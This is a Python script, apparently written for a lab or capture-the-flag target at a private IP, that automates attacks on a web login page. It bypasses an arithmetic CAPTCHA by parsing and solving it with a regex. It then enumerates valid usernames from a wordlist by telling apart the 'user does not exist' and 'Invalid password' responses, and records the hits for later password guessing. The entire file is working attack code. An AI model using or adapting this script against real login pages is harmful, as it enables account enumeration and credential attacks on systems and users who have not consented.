import requests
import re
import time

URL = "http://10.10.49.39/login"

def solve_captcha(html):
    match = re.search(r'(\d+)\s*([-+*/])\s*(\d+)', html)
    if not match:
        print("[DEBUG] CAPTCHA regex didn't match.")
        return None

    a = int(match.group(1))
    op = match.group(2)
    b = int(match.group(3))

    if op == '+':
        return a + b
    elif op == '-':
        return a - b
    elif op == '*':
        return a * b
    elif op == '/':
        return a // b if b != 0 else None
    return None

def attempt_login(username, password):
    session = requests.Session()

    # Step 1: Trigger CAPTCHA
    fake_login = session.post(URL, data={
        "username": "fake",
        "password": "fake",
        "captcha": "1"
    })

    captcha_html = fake_login.text
    captcha = solve_captcha(captcha_html)

    if captcha is None:
        print(f"[!] Could not solve CAPTCHA for {username}")
        return False

    # Step 2: Real login with test password
    data = {
        "username": username,
        "password": password,
        "captcha": str(captcha)
    }

    try:
        r = session.post(URL, data=data)
    except Exception as e:
        print(f"[!] Error during login for {username}: {e}")
        return False

    # Step 3: Analyze response
    if "Invalid captcha" in r.text:
        return False
    elif f"The user '{username}' does not exist" in r.text or f"The user &#39;{username}&#39; does not exist" in r.text:
        return "invalid_user"
    elif "Invalid password" in r.text:
        return "valid_user"
    elif "Intranet login" not in r.text:
        return "success"
    else:
        return False

def main():
    try:
        with open("usernames.txt") as uf:
            usernames = [u.strip() for u in uf if u.strip()]
        with open("passwords.txt") as pf:
            passwords = [p.strip() for p in pf if p.strip()]
    except Exception as e:
        print(f"[!] Failed to read wordlists: {e}")
        return

    test_password = passwords[0] if passwords else "testpass"

    for username in usernames:
        print(f"[~] Testing {username}")
        result = attempt_login(username, test_password)
        time.sleep(1.5)

        if result == "valid_user":
            print(f"[+] Valid username: {username}")
            with open("valid_usernames.txt", "a") as f:
                f.write(username + "\n")
        elif result == "invalid_user":
            print(f"[x] Invalid username: {username}")

if __name__ == "__main__":
    main()
